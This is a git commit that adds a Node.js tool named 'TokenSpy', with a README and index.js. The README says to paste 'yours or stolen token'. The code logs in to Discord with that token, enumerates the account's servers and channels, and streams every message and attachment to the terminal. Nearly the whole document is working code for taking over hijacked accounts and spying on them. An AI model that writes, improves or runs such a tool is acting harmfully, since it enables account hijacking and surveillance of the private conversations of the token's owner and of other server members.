15839c732f66c662c37fdcd24c6b1e2eeec6af9a
_Niemals <52979674+NeverLore@users.noreply.github.com>
2020-07-16 21:56:50 +0300

    upload 1.0

---
+++ README.md
@@ -0,0 +1,19 @@
+#Requirements:
+`NodeJS 12+`
+#To run: 
+open `run.cmd`, copy to clipboard yours or stolen token and click `RMB` in terminal, then press `Enter`
+
+#Installing:
+open terminal in your folder (press SHIFT + RMB).
+ - Before installing, check **Requirements** ⬆️
+Initialize the project:
+```
+$ npm init
+```
+Then use in terminal this commands:
+```
+$ npm i discord.js --save
+
+$ npm i terminal-kit --save
+```
+Cool! Now you can run your `TokenSpy`!
---
+++ index.js
@@ -0,0 +1,33 @@
+const { Client } = require("discord.js");
+var term = require( 'terminal-kit' ).terminal;
+
+const bot = new Client();
+term.green("Stoled token:\n")
+term.inputField(
+    function( error , input ) {
+        bot.login(input)
+			.catch(e => console.log(e))
+
+		bot.on("ready", () => {
+			term(`\n^yIt's^ ${bot.user.username}\n^yIsBot?:^ ${bot.user.bot}\n^yguildlist:^\n`)
+			bot.guilds.cache.forEach(g => {
+				term(`${g.name} | ${g.id} -> [^r${g.channels.cache.size}^w] ${g.owner.user.username}\n`)
+				g.channels.cache.forEach(c => {
+					if (c.type != "text") return;
+					term(`\t[^r${c.position}^w] ${c.name} | ${c.id}\n`)
+				})				
+			})
+
+			term.green("\n\n----------------\nJust Chatting!\n----------------\n\n")
+
+		})
+
+bot.on("message", msg => {
+	if (!msg.attachments.first()) {
+		var atch = '\t'
+	} else {
+		var atch = msg.attachments.first().url
+	}
+	term(`[ ^y${msg.guild.name}^ / ^y${msg.channel.name}^ ] ^o${msg.author.username}^: ${msg.content}\n${atch}\n`)
+})});
+
